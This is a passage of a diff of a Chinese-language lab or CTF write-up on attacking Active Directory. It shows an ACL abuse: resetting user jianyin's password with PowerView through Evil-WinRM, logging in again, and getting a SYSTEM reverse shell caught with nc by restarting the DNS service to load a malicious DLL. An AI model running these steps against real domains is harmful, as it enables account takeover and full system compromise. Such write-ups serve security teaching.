-SecurityIdentifier      : S<span class="pl-k">-</span><span class="pl-c1">1</span><span class="pl-k">-</span><span class="pl-c1">5</span><span class="pl-k">-</span><span class="pl-c1">21</span><span class="pl-k">-</span><span class="pl-c1">298176814</span><span class="pl-k">-</span><span class="pl-c1">2846777796</span><span class="pl-k">-</span><span class="pl-c1">698167141</span><span class="pl-k">-</span><span class="pl-c1">2107</span>
+SecurityIdentifier      : S-1-5-21-298176814-2846777796-698167141-2107
 IdentityReferenceName   : AccountModifier
-IdentityReferenceDomain : <span class="pl-c1">bicker.com</span>
-IdentityReferenceDN     : CN<span class="pl-k">=</span>AccountModifier<span class="pl-k">,</span>CN<span class="pl-k">=</span>Users<span class="pl-k">,</span>DC<span class="pl-k">=</span>bicker<span class="pl-k">,</span>DC<span class="pl-k">=</span>com
-IdentityReferenceClass  : group</pre></div>
+IdentityReferenceDomain : bicker.com
+IdentityReferenceDN     : CN=AccountModifier,CN=Users,DC=bicker,DC=com
+IdentityReferenceClass  : group
+</code></pre>
 <p><strong>分析结果</strong>：输出极为精确地告诉我们，<code class="notranslate">AccountModifier</code> 组对 <code class="notranslate">jianyin</code> 用户对象拥有的并非通用写入权，而是一项特定的<strong>扩展权限 (Extended Right)</strong>：<code class="notranslate">User-Force-Change-Password</code>。</p>
 <h3>4.3. 精准利用 ACL 控制用户</h3>
 <p>要利用这一特定的委派权限，必须使用能够调用相应 ADSI 接口的工具。PowerView 的 <code class="notranslate">Set-DomainUserPassword</code> 函数正是为此设计的。</p>
 <ul>
 <li><strong>处理 <code class="notranslate">SecureString</code></strong><br>
 <strong>技术背景</strong>：为安全起见，现代 PowerShell cmdlet 通常要求密码参数为 <code class="notranslate">SecureString</code> 类型，这是一种在内存中加密存储的字符串对象。我们需要先将明文密码进行转换。
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-smi">$SecurePassword</span> <span class="pl-k">=</span> <span class="pl-c1">ConvertTo-SecureString</span> <span class="pl-s"><span class="pl-pds">'</span>P@ssword123!<span class="pl-pds">'</span></span> <span class="pl-k">-</span>AsPlainText <span class="pl-k">-</span>Force</pre></div>
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\wirteTEMP&gt; $SecurePassword = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
+</code></pre>
 </li>
 <li><strong>重置密码</strong><br>
 现在，我们可以调用函数，并传入转换后的 <code class="notranslate">SecureString</code> 对象。
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\wirteTEMP<span class="pl-k">&gt;</span> <span class="pl-c1">Set-DomainUserPassword</span> <span class="pl-k">-</span>Identity jianyin <span class="pl-k">-</span>AccountPassword <span class="pl-smi">$SecurePassword</span> <span class="pl-k">-</span>Verbose
-Verbose: [<span class="pl-k">Set</span><span class="pl-k">-</span><span class="pl-k">DomainUserPassword</span>] Attempting to set the password <span class="pl-k">for</span> user <span class="pl-s"><span class="pl-pds">'</span>jianyin<span class="pl-pds">'</span></span>
-Verbose: [<span class="pl-k">Set</span><span class="pl-k">-</span><span class="pl-k">DomainUserPassword</span>] Password <span class="pl-k">for</span> user <span class="pl-s"><span class="pl-pds">'</span>jianyin<span class="pl-pds">'</span></span> successfully reset</pre></div>
+<pre lang="powershell" class="notranslate"><code class="notranslate">*Evil-WinRM* PS C:\wirteTEMP&gt; Set-DomainUserPassword -Identity jianyin -AccountPassword $SecurePassword -Verbose
+Verbose: [Set-DomainUserPassword] Attempting to set the password for user 'jianyin'
+Verbose: [Set-DomainUserPassword] Password for user 'jianyin' successfully reset
+</code></pre>
 命令成功执行，我们已完全控制 <code class="notranslate">jianyin</code> 账户。</li>
 </ul>
 <h3>4.4. 触发漏洞，获取 SYSTEM 权限</h3>
@@ -454,32 +476,36 @@ Verbose: [<span class="pl-k">Set</span><span class="pl-k">-</span><span class="p
 <ul>
 <li><strong>使用新凭据登录</strong><br>
 我们现在以 <code class="notranslate">jianyin</code> 的身份登录，他的密码已被我们重置为 <code class="notranslate">P@ssword123!</code>。
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
-└─$ evil-winrm -i 192.168.205.149 -u <span class="pl-s"><span class="pl-pds">'</span>jianyin<span class="pl-pds">'</span></span> -p <span class="pl-s"><span class="pl-pds">'</span>P@ssword123!<span class="pl-pds">'</span></span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ evil-winrm -i 192.168.205.149 -u 'jianyin' -p 'P@ssword123!'
 ...
-<span class="pl-k">*</span>Evil-WinRM<span class="pl-k">*</span> PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\j</span>ianyin<span class="pl-cce">\D</span>ocuments<span class="pl-k">&gt;</span> whoami
-bicker<span class="pl-cce">\j</span>ianyin</pre></div>
+*Evil-WinRM* PS C:\Users\jianyin\Documents&gt; whoami
+bicker\jianyin
+</code></pre>
 </li>
 <li><strong>准备监听并重启服务</strong><br>
 在 Kali 上开启 Netcat 监听，准备接收反弹 Shell。然后在 <code class="notranslate">jianyin</code> 的会话中，执行重启 DNS 服务的命令。
-<div class="highlight highlight-source-shell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 Kali 终端</span>
+<pre lang="bash" class="notranslate"><code class="notranslate"># 在 Kali 终端
 ┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888
-listening on [any] 8888 ...</pre></div>
-<div class="highlight highlight-source-powershell"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span> 在 jianyin 的 evil-winrm shell 中</span>
-<span class="pl-k">*</span>Evil<span class="pl-k">-</span>WinRM<span class="pl-k">*</span> PS C:\Users\jianyin\Documents<span class="pl-k">&gt;</span> <span class="pl-c1">Restart-Service</span> DNS</pre></div>
+listening on [any] 8888 ...
+</code></pre>
+<pre lang="powershell" class="notranslate"><code class="notranslate"># 在 jianyin 的 evil-winrm shell 中
+*Evil-WinRM* PS C:\Users\jianyin\Documents&gt; Restart-Service DNS
+</code></pre>
 </li>
 <li><strong>接收 Shell，提权成功</strong><br>
 DNS 服务重启时，加载了我们预先设置的恶意 DLL。Kali 的监听窗口成功接收到连接，我们获得了一个 <code class="notranslate">NT AUTHORITY\SYSTEM</code> 权限的 shell。
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
 └─$ nc -lvnp 8888
 listening on [any] 8888 ...
 connect to [192.168.205.128] from (UNKNOWN) [192.168.205.149] 58463
 Microsoft Windows [�汾 10.0.20348.169]
 (c) Microsoft Corporation����������Ȩ����
 
-C:<span class="pl-cce">\W</span>indows<span class="pl-cce">\s</span>ystem<span class="pl-k">32&gt;</span>whoami
-nt authority<span class="pl-cce">\s</span>ystem</pre></div>
+C:\Windows\system32&gt;whoami
+nt authority\system
+</code></pre>
 </li>
 </ul>
 <h1><strong>四、夺取凭证</strong></h1>
